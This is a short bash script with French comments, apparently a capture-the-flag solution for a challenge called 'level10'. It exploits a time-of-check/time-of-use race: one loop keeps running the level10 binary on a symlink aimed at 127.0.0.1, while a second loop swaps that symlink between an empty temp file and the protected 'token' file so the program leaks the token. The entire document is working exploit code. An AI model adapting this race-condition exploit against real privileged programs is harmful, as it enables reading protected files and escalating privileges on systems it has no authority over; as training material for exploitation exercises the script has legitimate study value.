#!/bin/bash

random_file=$(mktemp /tmp/fileXXXX)   # fichier temporaire vide
link_name=$(mktemp -u /tmp/linkXXXX) # nom de lien temporaire

# Boucle qui exécute level10 en continu
while true; do
    /home/user/level10/level10 $link_name 127.0.0.1 &>/dev/null
done &

# Boucle qui change rapidement le lien symbolique
while true; do
    ln -fs /home/user/level10/token $link_name
    ln -fs $random_file $link_name
done
